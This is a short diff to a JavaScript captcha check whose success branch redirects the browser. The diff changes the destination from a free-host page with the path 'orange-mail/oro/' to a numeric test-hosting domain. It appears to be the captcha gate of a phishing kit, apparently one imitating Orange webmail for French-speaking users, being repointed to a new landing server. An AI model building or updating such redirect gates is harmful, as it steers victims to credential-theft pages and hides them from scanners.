@@ -30,10 +30,11 @@ function validateCaptcha() {
     event.preventDefault();
     debugger
     if (document.getElementById("cpatchaTextBox").value == code) {
-        targetURL="https://iniklinkorng.mypi.co/orange-mail/oro/";
+        targetURL="http://3279939.vi597387.web.hosting-test.net/";
 window.location=targetURL;
     } else {
         alert("Invalid Captcha. Veuillez réessayer svp");
         createCaptcha();
     }
+
 }
